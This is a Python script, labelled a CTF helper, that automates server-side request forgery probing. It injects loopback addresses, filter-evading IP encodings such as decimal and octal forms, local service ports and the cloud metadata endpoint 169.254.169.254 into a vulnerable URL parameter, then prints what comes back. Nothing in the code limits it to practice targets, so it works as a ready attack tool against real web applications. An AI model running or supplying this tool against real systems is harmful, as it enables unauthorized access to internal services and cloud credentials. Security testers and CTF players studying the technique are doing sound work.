#!/usr/bin/env python3
"""SSRF probe helper for CTF targets.

The URL must contain INJECT. The script prints response status/length/snippet
for common loopback and internal targets. It does not scan large port ranges.
"""

import argparse
import requests


DEFAULT_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://127.1/",
    "http://2130706433/",
    "http://0177.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:8000/",
    "http://169.254.169.254/latest/meta-data/",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="URL containing INJECT placeholder")
    ap.add_argument("--target", action="append", default=[])
    ap.add_argument("--cookie", action="append", default=[])
    args = ap.parse_args()

    cookie = dict(x.split("=", 1) for x in args.cookie)
    for target in args.target or DEFAULT_TARGETS:
        probe = args.url.replace("INJECT", requests.utils.quote(target, safe=":/?&=#[]@."))
        try:
            r = requests.get(probe, cookies=cookie, timeout=8)
            snippet = r.text[:160].replace("\n", " ")
            print(f"{target}\tstatus={r.status_code}\tlen={len(r.text)}\t{snippet}")
        except requests.RequestException as e:
            print(f"{target}\tERROR\t{e}")


if __name__ == "__main__":
    main()

